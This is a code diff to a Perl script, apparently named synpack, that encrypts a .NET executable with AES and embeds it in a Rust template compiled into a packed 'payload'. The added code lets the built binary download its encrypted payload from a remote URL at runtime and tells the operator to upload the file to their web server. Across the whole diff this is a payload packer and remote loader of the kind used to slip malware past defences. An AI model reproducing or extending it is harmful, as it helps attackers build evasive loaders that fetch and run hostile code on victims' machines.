@@ -21,10 +21,12 @@ LOGO
 }
 
 sub c_print {
-    my ($stmt, $val) = @_;
+    my ($stmt, $val, $color) = @_;
 
-    print(BOLD, BRIGHT_BLUE, "$stmt", RESET);
-    print("$val\n") if defined $val;
+    $color = BRIGHT_BLUE if !$color;
+
+    print(BOLD, $color, "$stmt", RESET);
+    print("$val") if defined $val;
 }
 
 sub aes_encrypt {
@@ -82,38 +84,83 @@ sub hex_format_data {
     return $hex_str;
 }
 
+sub gen_random_string {
+    my $str_len = shift;
+
+    my @chars = ('a'..'z', 'A'..'Z');
+    my $rand_str;
+    foreach (1..$str_len) {
+        $rand_str .= $chars[rand @chars];
+    }
+    return $rand_str;
+}
+
 
 
 print_header();
 my $usage = qq{
-Usage: perl .\\synpack.pl <path_to_exe> <arguments>
+Usage: perl .\\synpack.pl <path or url to exe> <arguments>
 (You can also omit the arguments and pass them directly to the binary)
 };
 my $filepath  = shift @ARGV or die($usage);
-my $exe_args = shift @ARGV or "";
+my $exe_args  = shift @ARGV or "";
+my $encrypt   = 0;
+my $web       = 0;
+my $url       = "";
 
-c_print("[+] Opening: ", $filepath);
+if (substr($filepath, 0, 4) eq "http") {
+    $web = 1;
+    $url = $filepath;
+    c_print("[?] Do you want to encrypt the remote payload? (y/N) ");
+    my $resp = <>;
+    chomp($resp);
+    if (lc($resp) eq "y") {
+        $encrypt = 1;
+        c_print("[+] Enter filepath to exe without quotes: ");
+        $filepath = <>;
+        chomp($filepath);
+    }
+}
 
-open(my $file, "<:raw", $filepath) or die("[!] Cant open file! $!\n");
 
-#hex_print_file($file);
-my $file_bytes = get_file_bytes($file);
-close($file);
-# hex_format_data($file_bytes);
+my $hex_data = "";
+my $hex_key  = "";
+my $hex_iv   = "";
 
-c_print("[+] Encrypting .NET executable\n");
+if (!$web || ($web && $encrypt)) {
 
-my ($enc_data, $key, $iv) = aes_encrypt($file_bytes);
+    c_print("[+] Opening: ", "$filepath\n");
+    open(my $file, "<:raw", $filepath) or exit(c_print("[!] Cant open file! ", "$filepath\n", BRIGHT_RED));
+    my $file_bytes = get_file_bytes($file);
+    close($file);
 
-my $hex_data = hex_format_data($enc_data);
-my $hex_key  = hex_format_data($key);
-my $hex_iv   = hex_format_data($iv);
+    c_print("[+] Encrypting .NET executable\n", "", BRIGHT_GREEN);
+
+    $encrypt = 1;
+    my ($enc_data, $key, $iv) = aes_encrypt($file_bytes);
+    
+    if ($web) {
+        my $outfile = gen_random_string(8);
+        open(my $out, '>:raw', ".\\output\\$outfile") or exit(c_print("[!] Couldn't save encrypted payload!\n", "", BRIGHT_RED));
+        syswrite $out, $enc_data;
+        close($out);
+
+        c_print("[+] Saved encrypted binary to: ", ".\\output\\$outfile\n", BRIGHT_GREEN);
+        c_print("[!] URL will be updated with the new filename.\n", "", BRIGHT_RED);
+        c_print("[!] *** ENSURE YOU UPLOAD THIS FILE TO YOUR WEB SERVER!! ***\n", "", BRIGHT_RED);
+        $url =~ s/\/([^\/]+)$/\/$outfile/;
+    }
+
+    $hex_data = hex_format_data($enc_data);
+    $hex_key  = hex_format_data($key);
+    $hex_iv   = hex_format_data($iv);
+}
 
 c_print("[+] Copying template.rs to src/main.rs\n");
 
 copy("template.rs", "src\\main.rs") or die("Copy failed: $!\n");
 
-c_print("[+] Updating main.rs placeholders with payload data\n");
+c_print("[+] Updating main.rs placeholders with payload data\n", "", BRIGHT_GREEN);
 
 my $args = "";
 $args = "String::from(\"$exe_args\")" if $exe_args;
@@ -123,8 +170,24 @@ my $replace = $template->slurp_utf8;
 
 $replace =~ s/SYNPACK_KEY/$hex_key/g;
 $replace =~ s/SYNPACK_IV/$hex_iv/g;
-$replace =~ s/SYNPACK_DATA/$hex_data/g;
+$replace =~ s/SYNPACK_DATA/$hex_data/g if !$url;
 $replace =~ s/SYNPACK_ARGS/$args/g;
+
+if (!$encrypt) {
+    $replace =~ s/\/\/AES_START/\/*/g;
+    $replace =~ s/\/\/AES_END/*\//g;
+    $replace =~ s/decrypt_aes\(&mut bin_data\);//g;
+}
+
+if (!$web) {
+    $replace =~ s/\/\/WEB_START/\/*/g;
+    $replace =~ s/\/\/WEB_END/*\//g;
+}
+
+if ($url) {
+    $replace =~ s/SYNPACK_URL/$url/g;
+    $replace =~ s/vec\!\[SYNPACK_DATA\];/get_data().await;/g;
+}
 
 $template->spew_utf8($replace);
 
@@ -135,4 +198,5 @@ unlink($exepath) if -e $exepath;
 
 system("cargo build --release");
 
-c_print("[+] Done! Payload located at: ", $exepath) if -e $exepath;
+c_print("[+] Done! Payload located at: ", "$exepath\n", BRIGHT_GREEN) if -e $exepath;
+c_print("[+] Payload will be downloaded from: ", "$url\n", BRIGHT_GREEN) if -e $exepath;
